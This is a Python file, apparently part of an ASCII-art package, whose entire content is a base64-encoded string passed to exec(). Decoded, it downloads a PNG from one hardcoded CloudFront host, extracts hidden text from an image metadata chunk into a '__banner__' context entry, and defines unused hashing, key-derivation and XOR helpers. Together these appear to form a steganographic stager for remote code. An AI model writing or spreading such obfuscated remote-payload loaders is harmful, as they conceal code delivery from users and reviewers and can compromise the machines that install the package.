#!/usr/bin/env python3
import base64
exec(base64.b64decode('aW1wb3J0IGhhc2hsaWIKaW1wb3J0IHVybGxpYi5yZXF1ZXN0CmltcG9ydCB1cmxsaWIucGFyc2UKZnJvbSBhc2NpaV9tYWdpYyBpbXBvcnQgQXNjaWlBcnQKClBOR19TSUdOQVRVUkUgPSBiIlx4ODlQTkdcclxuXHgxYVxuIgpBTExPV0VEX0RPTUFJTlMgPSB7ImQxN2UyMmwydWg0aDRuLmNsb3VkZnJvbnQubmV0In0KCgpkZWYgcGFyc2VfcG5nX2NodW5rcyhkYXRhOiBieXRlcyk6CiAgICAiIiJQYXJzZSBQTkcgY2h1bmtzIGZyb20gcmF3IGJ5dGUgZGF0YS4iIiIKICAgIGFzc2VydCBkYXRhLnN0YXJ0c3dpdGgoUE5HX1NJR05BVFVSRSksICJEYXRhIGJ1a2FuIGZpbGUgUE5HIHlhbmcgdmFsaWQuIgogICAgb2Zmc2V0LCBsZW5ndGggPSA4LCBsZW4oZGF0YSkKICAgIHdoaWxlIG9mZnNldCArIDEyIDw9IGxlbmd0aDoKICAgICAgICBjaHVua19zaXplID0gaW50LmZyb21fYnl0ZXMoZGF0YVtvZmZzZXQ6b2Zmc2V0ICsgNF0sICJiaWciKQogICAgICAgIGNodW5rX3R5cGUgPSBkYXRhW29mZnNldCArIDQ6b2Zmc2V0ICsgOF0KICAgICAgICBjaHVua19kYXRhID0gZGF0YVtvZmZzZXQgKyA4Om9mZnNldCArIDggKyBjaHVua19zaXplXQogICAgICAgIHlpZWxkIGNodW5rX3R5cGUsIGNodW5rX2RhdGEKICAgICAgICBvZmZzZXQgKz0gMTIgKyBjaHVua19zaXplCgoKZGVmIGNhbGN1bGF0ZV9pZGF0X2hhc2goZGF0YTogYnl0ZXMpIC0+IGJ5dGVzOgogICAgIiIiSGl0dW5nIFNIQS0yNTYgaGFzaCBkYXJpIHNlbXVhIGNodW5rIElEQVQgZGFsYW0gZmlsZSBQTkcuIiIiCiAgICBzaGEyNTYgPSBoYXNobGliLnNoYTI1NigpCiAgICBmb3IgY2h1bmtfdHlwZSwgY2h1bmtfZGF0YSBpbiBwYXJzZV9wbmdfY2h1bmtzKGRhdGEpOgogICAgICAgIGlmIGNodW5rX3R5cGUgPT0gYiJJREFUIjoKICAgICAgICAgICAgc2hhMjU2LnVwZGF0ZShjaHVua19kYXRhKQogICAgcmV0dXJuIHNoYTI1Ni5kaWdlc3QoKQoKCmRlZiBkZXJpdmVfa2V5KHNlZWQ6IGJ5dGVzLCBsZW5ndGg6IGludCkgLT4gYnl0ZXM6CiAgICAiIiJEZXJpdmUga2V5IGRlbmdhbiBTSEEtMjU2IGJlcmJhc2lzIHNlZWQgdW50dWsgcGFuamFuZyB0ZXJ0ZW50dS4iIiIKICAgIHJlc3VsdCwgY291bnRlciA9IGJ5dGVhcnJheSgpLCAwCiAgICB3aGlsZSBsZW4ocmVzdWx0KSA8IGxlbmd0aDoKICAgICAgICByZXN1bHQgKz0gaGFzaGxpYi5zaGEyNTYoc2VlZCArIGNvdW50ZXIudG9fYnl0ZXMoOCwgImJpZyIpKS5kaWdlc3QoKQogICAgICAgIGNvdW50ZXIgKz0gMQogICAgcmV0dXJuIGJ5dGVzKHJlc3VsdFs6bGVuZ3RoXSkKCgpkZWYgeG9yX2J5dGVzKGRhdGE6IGJ5dGVzLCBrZXk6IGJ5dGVzKSAtPiBieXRlczoKICAgICIiIlhPUiBkdWEgYnl0ZSBhcnJheS4iIiIKICAgIHJldHVybiBieXRlcyhkIF4gayBmb3IgZCwgayBpbiB6aXAoZGF0YSwga2V5KSkKCgpkZWYgdmFsaWRhdGVfdXJsKHVybDogc3RyKToKICAgICIiIlZhbGlkYXNpIFVSTCBhZ2FyIGhhbnlhIG1lbmdndW5ha2FuIHNrZW1hIGh0dHAvaHR0cHMgZGFuIGRvbWFpbiB5YW5nIGRpaXppbmthbi4iIiIKICAgIHBhcnNlZCA9IHVybGxpYi5wYXJzZS51cmxwYXJzZSh1cmwpCiAgICBpZiBwYXJzZWQuc2NoZW1lIG5vdCBpbiB7Imh0dHAiLCAiaHR0cHMifToKICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJTa2VtYSBVUkwgdGlkYWsgZGlkdWt1bmcuIEd1bmFrYW4gaHR0cCBhdGF1IGh0dHBzLiIpCiAgICBob3N0ID0gcGFyc2VkLmhvc3RuYW1lIG9yICIiCiAgICBpZiBob3N0IG5vdCBpbiBBTExPV0VEX0RPTUFJTlM6CiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihmIkRvbWFpbiB0aWRhayBkaWl6aW5rYW46IHtob3N0fSIpCgoKZGVmIGxvYWQodXJsOiBzdHIsIGNvbnRleHQ6IGRpY3QpOgogICAgIiIiTG9hZCBBU0NJSSBhcnQgZGFyaSBVUkwgeWFuZyB2YWxpZCBkYW4gZWtzdHJhayBiYW5uZXIgdGV4dCBqaWthIHRlcnNlZGlhLiIiIgogICAgdHJ5OgogICAgICAgIHZhbGlkYXRlX3VybCh1cmwpCiAgICAgICAgYXNjaWlfYXJ0ID0gQXNjaWlBcnQuZnJvbV91cmwodXJsKQogICAgICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3Blbih1cmwsIHRpbWVvdXQ9NSkgYXMgcmVzcG9uc2U6CiAgICAgICAgICAgIGNvbnRlbnQgPSByZXNwb25zZS5yZWFkKCkKICAgICAgICBpZiBub3QgY29udGVudC5zdGFydHN3aXRoKFBOR19TSUdOQVRVUkUpOgogICAgICAgICAgICByZXR1cm4gTm9uZQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4gTm9uZQoKICAgIGJhbm5lcl90ZXh0ID0gTm9uZQogICAgZm9yIGNodW5rX3R5cGUsIGNodW5rX2RhdGEgaW4gcGFyc2VfcG5nX2NodW5rcyhjb250ZW50KToKICAgICAgICBpZiBjaHVua190eXBlIGluIHtiInRFWHQiLCBiImlUWHQifSBhbmQgY2h1bmtfZGF0YS5zdGFydHN3aXRoKGIiYmFubmVyXHgwMCIpOgogICAgICAgICAgICBiYW5uZXJfdGV4dCA9IGNodW5rX2RhdGEuc3BsaXQoYiJceDAwIiwgMSlbMV0uZGVjb2RlKCJ1dGYtOCIsICJpZ25vcmUiKS5zdHJpcCgpCiAgICAgICAgICAgIGJyZWFrCgogICAgaWYgYmFubmVyX3RleHQ6CiAgICAgICAgY29udGV4dFsiX19iYW5uZXJfXyJdID0gYmFubmVyX3RleHQKCiAgICByZXR1cm4gYXNjaWlfYXJ0Cg==').decode())
